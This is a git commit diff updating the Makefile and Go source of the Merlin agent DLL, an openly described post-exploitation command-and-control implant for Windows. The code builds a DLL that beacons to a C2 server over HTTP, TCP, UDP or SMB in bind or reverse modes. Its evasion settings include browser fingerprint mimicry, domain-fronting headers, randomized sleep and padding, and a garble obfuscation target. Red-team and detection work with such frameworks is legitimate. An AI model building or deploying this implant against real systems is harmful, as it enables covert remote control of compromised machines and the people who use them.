cfcec1959cfba24f5b8dc1a48245adf609f40bff
Russel Van Tuyl <russel.vantuyl@gmail.com>
2023-11-04 06:03:51 -0400

    Updated for merlin-agent v2

--- Makefile
+++ Makefile
@@ -1,42 +1,54 @@
 # !!!MAKE SURE YOUR GOPATH ENVIRONMENT VARIABLE IS SET FIRST!!!
 
-# Merlin Server & Agent version number
-VERSION=1.6.0
+# Merlin Agent DLL
+VERSION=2.0.0-dll
 
 BUILD=$(shell git rev-parse HEAD)
 DIR=bin/v${VERSION}/${BUILD}
-XBUILD=-X main.build=${BUILD} -X github.com/Ne0nd0g/merlin/pkg/agent.build=${BUILD}
+XBUILD=-X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=${BUILD}"
 
 # Merlin Agent Variables
 URL ?= https://127.0.0.1:443
-XURL=-X main.url=${URL}
+XURL=-X "main.url=${URL}"
 PSK ?= merlin
-XPSK=-X main.psk=${PSK}
+XPSK=-X "main.psk=${PSK}"
 PROXY ?=
-XPROXY =-X main.proxy=$(PROXY)
-HOST ?=
-XHOST =-X main.host=$(HOST)
-PROTO ?= h2
-XPROTO =-X main.protocol=$(PROTO)
-JA3 ?=
-XJA3 =-X main.ja3=$(JA3)
-KILLDATE ?= 0
-XKILLDATE =-X main.killdate=$(KILLDATE)
-MAXRETRY ?= 7
-XMAXRETRY =-X main.maxretry=$(MAXRETRY)
-PADDING ?= 4096
-XPADDING =-X main.padding=$(PADDING)
-SKEW ?= 0
-XSKEW =-X main.skew=$(SKEW)
-USERAGENT ?= Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36
-XUSERAGENT =-X "main.useragent=$(USERAGENT)"
+XPROXY =-X "main.proxy=$(PROXY)"
 SLEEP ?= 30s
-XSLEEP = -X main.sleep=$(SLEEP)
+XSLEEP =-X "main.sleep=$(SLEEP)"
+HOST ?=
+XHOST =-X "main.host=$(HOST)"
+PROTO ?= h2
+XPROTO =-X "main.protocol=$(PROTO)"
+JA3 ?=
+XJA3 =-X "main.ja3=$(JA3)"
+USERAGENT = Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36
+XUSERAGENT =-X "main.useragent=$(USERAGENT)"
+HEADERS =
+XHEADERS =-X "main.headers=$(HEADERS)"
+SKEW ?= 3000
+XSKEW=-X "main.skew=${SKEW}"
+PAD ?= 4096
+XPAD=-X "main.padding=${PAD}"
+KILLDATE ?= 0
+XKILLDATE=-X "main.killdate=${KILLDATE}"
+RETRY ?= 7
+XRETRY=-X "main.maxretry=${RETRY}"
 PARROT ?=
 XPARROT=-X "main.parrot=${PARROT}"
+AUTH ?= opaque
+XAUTH=-X "main.auth=${AUTH}"
+ADDR ?= 127.0.0.1:4444
+XADDR=-X "main.addr=${ADDR}"
+TRANSFORMS ?= jwe,gob-base
+XTRANSFORMS=-X "main.transforms=${TRANSFORMS}"
+LISTENER ?=
+XLISTENER=-X "main.listener=${LISTENER}"
+SECURE ?= false
+XSECURE =-X "main.secure=${SECURE}"
 
 # Compile Flags
-LDFLAGS=-ldflags '-s -w ${XBUILD} ${XPROTO} ${XURL} ${XHOST} ${XPSK} ${XPROXY} ${XKILLDATE} ${XMAXRETRY} ${XPADDING} ${XSKEW} ${XUSERAGENT} ${XSLEEP} ${XPARROT} -buildid='
+LDFLAGS=-ldflags '-s -w ${XSECURE} ${XPARROT} ${XADDR} ${XAUTH} ${XTRANSFORMS} ${XLISTENER} ${XBUILD} ${XPROTO} ${XURL} ${XHOST} ${XPSK} ${XSLEEP} ${XPROXY} $(XUSERAGENT) $(XHEADERS) ${XSKEW} ${XPAD} ${XKILLDATE} ${XRETRY} -buildid='
 GCFLAGS=-gcflags=all=-trimpath=$(GOPATH)
 ASMFLAGS=-asmflags=all=-trimpath=$(GOPATH)# -asmflags=-trimpath=$(GOPATH)
 PACKAGE=7za a -p${PASSWORD} -mhe -mx=9
@@ -56,9 +68,10 @@ SEED=d0d03a0ae4722535a0e1d5d0c8385ce42015511e68d960fadef4b4eaf5942feb
 # Compile Agent - Windows x64 DLL - main() - Console
 default:
 	export GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1; \
-	go build ${LDFLAGS} ${GCFLAGS} ${ASMFLAGS} -buildmode=c-archive -o ${DIR}/main.a main.go; \
-	cp merlin.c ${DIR}; \
-	x86_64-w64-mingw32-gcc -shared -pthread -o ${DIR}/merlin.dll ${DIR}/merlin.c ${DIR}/main.a -lwinmm -lntdll -lws2_32
+	go build ${LDFLAGS} ${GCFLAGS} ${ASMFLAGS} -buildmode=c-archive -o ${DIR}/main.a main.go && \
+	cp merlin.c ${DIR} && \
+	x86_64-w64-mingw32-gcc -shared -pthread -o ${DIR}/merlin.dll ${DIR}/merlin.c ${DIR}/main.a -lwinmm -lntdll -lws2_32 && \
+	cp ${DIR}/merlin.dll .
 
 garble:
 	export GOGARBLE=${GOGARBLE}; export GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1; \
--- main.go
+++ main.go
@@ -1,49 +1,112 @@
 //go:build windows && cgo
 // +build windows,cgo
 
-// Merlin is a post-exploitation command and control framework.
-// This file is part of Merlin.
-// Copyright (C) 2022  Russel Van Tuyl
+/*
+Merlin is a post-exploitation command and control framework.
 
-// Merlin is free software: you can redistribute it and/or modify
-// it under the terms of the GNU General Public License as published by
-// the Free Software Foundation, either version 3 of the License, or
-// any later version.
+This file is part of Merlin.
+Copyright (C) 2023 Russel Van Tuyl
 
-// Merlin is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
+Merlin is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+any later version.
 
-// You should have received a copy of the GNU General Public License
-// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
+Merlin is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
+*/
 
 package main
 
 import (
 	"C"
 	"os"
+	"strconv"
 	"strings"
 
+	// 3rd Party
+	"github.com/google/uuid"
+
 	// Merlin
-	"github.com/Ne0nd0g/merlin-agent/agent"
-	"github.com/Ne0nd0g/merlin-agent/clients/http"
+	"github.com/Ne0nd0g/merlin-agent/v2/agent"
+	"github.com/Ne0nd0g/merlin-agent/v2/clients"
+	"github.com/Ne0nd0g/merlin-agent/v2/clients/http"
+	"github.com/Ne0nd0g/merlin-agent/v2/clients/smb"
+	"github.com/Ne0nd0g/merlin-agent/v2/clients/tcp"
+	"github.com/Ne0nd0g/merlin-agent/v2/clients/udp"
+	mRun "github.com/Ne0nd0g/merlin-agent/v2/run"
 )
 
-var url = "https://127.0.0.1:443"
-var psk = "merlin"
-var proxy = ""
+// GLOBAL VARIABLES
+// These are use hard code configurable options during compile time with Go's ldflags -X option
+
+// auth the authentication method the Agent will use to authenticate to the server
+var auth = "opaque"
+
+// addr the interface and port the agent will use for network connections
+var addr = "127.0.0.1:7777"
+
+// headers a list of HTTP headers the agent will use with the HTTP protocol to communicate with the server
+var headers = ""
+
+// host a specific HTTP header used with HTTP communications; notably used for domain fronting
 var host = ""
+
+// ja3 a string that represents how the Agent should configure it TLS client
 var ja3 = ""
-var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
-var sleep = "30s"
-var skew = "3000"
+
+// killdate the date and time, as a unix epoch timestamp, that the agent will quit running
 var killdate = "0"
+
+// listener the UUID of the peer-to-peer listener this agent belongs to. Used with delegate messages
+var listener = ""
+
+// maxretry the number of failed connections to the server before the agent will quit running
 var maxretry = "7"
-var padding = "4096"
+
+// opaque the EnvU data from OPAQUE registration so the agent can skip straight to authentication
 var opaque []byte
-var protocol = "h2"
+
+// padding the maximum size for random amounts of data appended to all messages to prevent static message sizes
+var padding = "4096"
+
+// parrot a string from the https://github.com/refraction-networking/utls#parroting library to mimic a specific browser
 var parrot = ""
+
+// protocol the communication protocol the agent will use to communicate with the server
+var protocol = "h2"
+
+// proxy the address of HTTP proxy to send HTTP traffic through
+var proxy = ""
+
+// psk is the Pre-Shared Key, the secret used to encrypt messages communications with the server
+var psk = "merlin"
+
+// secure a boolean value as a string that determines the value of the TLS InsecureSkipVerify option for HTTP
+// communications.
+// Must be a string, so it can be set from the Makefile
+var secure = "false"
+
+// sleep the amount of time the agent will sleep before it attempts to check in with the server
+var sleep = "30s"
+
+// skew the maximum size for random amounts of time to add to the sleep value to vary checkin times
+var skew = "3000"
+
+// transforms is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
+// that will be sent to the server
+var transforms = "jwe,gob-base"
+
+// url the protocol, address, and port of the Agent's command and control server to communicate with
+var url = "https://127.0.0.1:443"
+
+// useragent the HTTP User-Agent header for HTTP communications
+var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
 
 func main() {}
 
@@ -56,33 +119,122 @@ func run(URL string) {
 		KillDate: killdate,
 		MaxRetry: maxretry,
 	}
-	a := agent.New(agentConfig)
-
-	// Get the client
-	var errClient error
-	clientConfig := http.Config{
-		AgentID:     a.ID,
-		Protocol:    protocol,
-		Host:        host,
-		Proxy:       proxy,
-		UserAgent:   useragent,
-		PSK:         psk,
-		JA3:         ja3,
-		Parrot:      parrot,
-		Padding:     padding,
-		AuthPackage: "opaque",
-		Opaque:      opaque,
-	}
-	if URL != "" {
-		clientConfig.URL = strings.Split(strings.ReplaceAll(URL, " ", ""), ",")
-	}
-
-	a.Client, errClient = http.New(clientConfig)
-	if errClient != nil {
+	a, err := agent.New(agentConfig)
+	if err != nil {
 		os.Exit(1)
 	}
 
-	a.Run()
+	// Parse the secure flag
+	var verify bool
+	verify, err = strconv.ParseBool(secure)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	// Get the client
+	var client clients.Client
+	switch protocol {
+	case "http", "https", "h2", "h2c", "http3":
+		clientConfig := http.Config{
+			AgentID:      a.ID(),
+			Protocol:     protocol,
+			Host:         host,
+			Headers:      headers,
+			Proxy:        proxy,
+			UserAgent:    useragent,
+			PSK:          psk,
+			JA3:          ja3,
+			Padding:      padding,
+			Parrot:       parrot,
+			AuthPackage:  auth,
+			Opaque:       opaque,
+			Transformers: transforms,
+			InsecureTLS:  !verify,
+		}
+
+		// URL is the value passed into this function; url is the global variable
+		if URL != "" {
+			clientConfig.URL = strings.Split(strings.ReplaceAll(url, " ", ""), ",")
+		} else if url != "" {
+			clientConfig.URL = strings.Split(strings.ReplaceAll(url, " ", ""), ",")
+		}
+
+		client, err = http.New(clientConfig)
+		if err != nil {
+			os.Exit(1)
+		}
+	case "tcp-bind", "tcp-reverse":
+		var listenerID uuid.UUID
+		listenerID, err = uuid.Parse(listener)
+		if err != nil {
+			os.Exit(1)
+		}
+		config := tcp.Config{
+			AgentID:      a.ID(),
+			ListenerID:   listenerID,
+			PSK:          psk,
+			Address:      []string{addr},
+			AuthPackage:  auth,
+			Transformers: transforms,
+			Mode:         protocol,
+			Padding:      padding,
+		}
+
+		// Get the client
+		client, err = tcp.New(config)
+		if err != nil {
+			os.Exit(1)
+		}
+	case "udp-bind", "udp-reverse":
+		var listenerID uuid.UUID
+		listenerID, err = uuid.Parse(listener)
+		if err != nil {
+			os.Exit(1)
+		}
+		config := udp.Config{
+			AgentID:      a.ID(),
+			ListenerID:   listenerID,
+			PSK:          psk,
+			Address:      []string{addr},
+			AuthPackage:  auth,
+			Transformers: transforms,
+			Mode:         protocol,
+			Padding:      padding,
+		}
+
+		// Get the client
+		client, err = udp.New(config)
+		if err != nil {
+			os.Exit(1)
+		}
+	case "smb-bind", "smb-reverse":
+		var listenerID uuid.UUID
+		listenerID, err = uuid.Parse(listener)
+		if err != nil {
+			os.Exit(1)
+		}
+		config := smb.Config{
+			Address:      []string{addr},
+			AgentID:      a.ID(),
+			AuthPackage:  auth,
+			ListenerID:   listenerID,
+			Padding:      padding,
+			PSK:          psk,
+			Transformers: transforms,
+			Mode:         protocol,
+		}
+		// Get the client
+		client, err = smb.New(config)
+		if err != nil {
+			os.Exit(1)
+		}
+	default:
+		// Unhandled protocol
+		os.Exit(1)
+	}
+
+	// Start the agent
+	mRun.Run(a, client)
 }
 
 // EXPORTED FUNCTIONS
